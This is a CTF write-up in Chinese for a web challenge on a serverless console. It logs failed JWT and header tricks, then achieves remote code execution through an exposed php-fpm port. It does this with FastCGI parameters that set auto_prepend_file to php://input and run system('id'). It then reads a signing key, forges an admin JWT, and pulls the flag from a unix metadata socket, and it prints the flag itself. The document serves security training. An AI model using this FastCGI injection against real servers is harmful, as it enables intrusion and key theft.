# a-18 · 探索记录

对应题解：[`a-18.md`](./a-18.md)。

## 目标与起点

题面：「Serverless 控制台，刚完成认证网关和运行时链路迁移，关注运行时限制里哪些能力仍然可用」。困难，500 分。

`nginx/1.10.3` + `PHP/5.6.40`。

## 第一阶段：登录（无校验）与 JWT

任意用户名/密码都能登录，302 到 `/control.php`，身份固定 `developer`，提示「暂无调试权限」。

Cookie：

```
user_email=dev
token=eyJraWQiOiJwcm9kLmtleSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0...
```

JWT header：`{"kid":"prod.key","typ":"JWT","alg":"HS256"}`。

试过：

| 尝试 | 结果 |
| --- | --- |
| 不带头直接访问 `/control.php` | 「请先登录」 |
| `X-Role: admin` 等 11 种头 | 仍然 developer |
| `Cookie: role=admin` / `is_admin=1` 等 | 仍然 developer |
| 用常见弱密钥 HS256 伪造（27 个候选） | 全部「请先登录」 |
| `kid=/dev/null`、`kid=../../../../dev/null` | 全部被拒 |

## 第二阶段：路由枚举与 `/keys`

ffuf 发现：

```
control.php  index.php  keys.php(403)  keysearch.php(403)  keystone.php(403)
vendor/composer/*  （可直读）
```

`/vendor/composer/installed.json` 确认：

```json
{"name":"firebase/php-jwt","version":"v5.2.0"}
```

`/keys/prod.key` 各种绕过（编码、`//`、`./`、`..;/`、`%00`）全部 403。

## 第三阶段：端口扫描 → 9000 是 php-fpm

```
80 open
9000 open
```

对 9000 发 HTTP 得到 `Connection reset by peer`——不是 HTTP 服务。结合 PHP 环境，判断是裸露的 php-fpm（FastCGI）。

## 第四阶段：FastCGI 直连

写了一个最小 FastCGI 客户端（`BEGIN_REQUEST` + `PARAMS` + `STDIN`）：

```python
params = {
 'REQUEST_METHOD':'POST',
 'SCRIPT_FILENAME':'/var/www/html/index.php',
 'PHP_VALUE':'allow_url_include=On\nauto_prepend_file=php://input',
 'PHP_ADMIN_VALUE':'allow_url_include=On\nauto_prepend_file=php://input',
 'CONTENT_LENGTH':str(len(body)),
}
body = '<?php system("id"); ?>'
```

返回 `uid=33(www-data)`。**绕过 nginx 拿到 PHP 执行。**

## 第五阶段：读 key、伪造 admin、读 socket

### 读私钥（nginx 403 但文件可读）

```php
file_get_contents('/var/www/html/keys/prod.key')
→ cloudfunc_prod_2026_hmac_key_keep_internal\n
```

`ls -la` 显示 `prod.key` 43 字节，字符串本身 42 字符——**末尾有换行**。

第一次伪造（不带换行）→ 「请先登录」；带上换行 → 管理员控制台。

### 管理员控制台

伪造成功后看到：

```
1,234 总调用次数 | 56 活跃函数 | 98.5% 可用性
单行触发器执行器已启用
研发备忘录 · 缺陷挂起 (Issue #CF-892)
  前端 name="php_code.execute"，后端 $_POST['php_code.execute']
  抓包发现点(.)确实传过去了，但后端死活拿不到数据
```

这段备忘录提示的是另一个 Bug（PHP 会把 POST 字段名里的 `.` 转成 `_`），但此时已有任意 PHP 执行，不需要走规则引擎。

### flag 不在文件里

`/challenge/flag.txt` 是 `-r-------- root root`，`www-data` 读不到。读 `/hint.txt`：

```
The flag is served by the local metadata agent, not by a world-readable file.
curl --unix-socket /run/cloudfunc/metadata.sock http://localhost/latest/flag
```

用 PHP 直连 unix socket：

```php
$s = stream_socket_client("unix:///run/cloudfunc/metadata.sock", $e, $m, 5);
fwrite($s, "GET /latest/flag HTTP/1.0\r\nHost: localhost\r\n\r\n");
echo stream_get_contents($s);
```

```
HTTP/1.1 200 OK
Server: CloudFuncMetadata/1.0 Python/3.5.3
flag{41215050-6171-49da-b48f-fc29547794de}
```

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 头部/ Cookie 提权（11 种头、4 种 cookie） | 无效 | 仍是 developer |
| 弱密钥 HS256（27 个候选） | 无效 | 全部「请先登录」 |
| `kid` 路径注入（`/dev/null` 等） | 无效 | 被拒 |
| `/keys/prod.key` 各种编码绕过 | 403 | nginx deny |
| 9000 发 HTTP | Connection reset | 不是 HTTP |
| **9000 FastCGI 直连** | **RCE** | `uid=33(www-data)` |
| 读 `/challenge/flag.txt` | 权限拒绝 | root-only |
| **读 `/hint.txt` → metadata socket** | **flag** | flag 由 agent 提供 |

## 这次真正的收获

1. **`Connection reset` 说明协议不对，不一定是端口关闭。** 9000 是 php-fpm，要说 FastCGI。
2. **nginx 的 403 只挡 HTTP。** 拿到任意 PHP 执行后，`/keys/` 这种 Web 层保护就失效了。
3. **按字节读密钥。** `ls` 的字节数与字符串长度差 1，就是末尾换行；漏掉它 JWT 永远验不过。
4. **JWT `kid` 只是线索。** 真正的弱点是私钥可读 + 运行时端口暴露，不是算法或 kid 注入。
5. **flag 可能在进程间通道上。** `/hint.txt` 明确指向 unix socket；`/challenge/flag.txt` 是 root-only 的诱饵。
6. **管理面板的「备忘录」是第二个 Bug 的提示**（`php_code.execute` 的点号被 PHP 转义），但有更直接的 RCE 时不必绕这一层。

---

## 补充：2026-10-27 本轮的卡点

### 9000 不是 HTTP

`GET :9000` 得到 `Connection reset`。结合 `php-fpm` 默认端口判断是 FastCGI，
需要构造 `BEGIN_REQUEST` + `PARAMS` + `STDIN`。

### 手写 FastCGI 的两个打包错误

| 报错 | 原因 | 修正 |
| --- | --- | --- |
| `struct.error: pack expected 6 items for packing (got 5)` | 头字段漏了一个 | `!BBHHBB`：version, type, requestId, contentLength, paddingLength, reserved |
| `struct.error: 'B' format requires 0 <= number <= 255` | 长度塞进了 `B` | 长度是 `H`（2 字节） |

### `/hint.txt` 在本实例是 404

题解说 `/hint.txt` 给出 metadata socket 路径，本轮 nginx 直接 404。
**判据**：404 是 nginx 的页，不是应用；直接跳过，靠 FastCGI 自己找。

### 转机（以及"跳过预期链路"）

FastCGI 直连已给任意 PHP 执行，所以：

1. 读 `/var/www/html/keys/prod.key` → `cloudfunc_prod_2026_hmac_key_keep_internal`（顺路验证）；
2. 伪造 HS256 admin JWT → `/control.php` 200（确认面板可进）；
3. **真正的 flag 用 `stream_socket_client("unix:///run/cloudfunc/metadata.sock")`
   直接读 `/latest/flag`**，绕过整条 JWT 链。

**教训**：已经有任意代码执行时，不必按题面链路从"读 key → 伪造 JWT → 面板"一路走完。
